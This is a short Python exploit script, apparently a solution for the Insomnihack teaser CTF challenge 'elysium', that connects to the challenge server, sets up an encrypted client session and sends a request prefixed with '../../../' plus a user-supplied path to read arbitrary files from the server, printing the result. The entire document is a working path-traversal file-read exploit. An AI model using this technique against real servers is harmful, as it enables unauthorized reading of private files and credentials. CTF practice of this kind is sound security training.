#!/usr/bin/env python3
#coding: UTF-8

from elysium import *

TARGET = ('elysium01.teaser.insomnihack.ch', 1234)

with connect(TARGET) as c:
    iv = c.recv(16)

    client = Client(c, iv)
    client.recv_msg()       # greeting
    client.recv_msg()       # help
    client.send_msg(b'1 ../../../' + e(sys.argv[1]) + b'\n')

    sys.stdout.buffer.write(client.recv_msg())

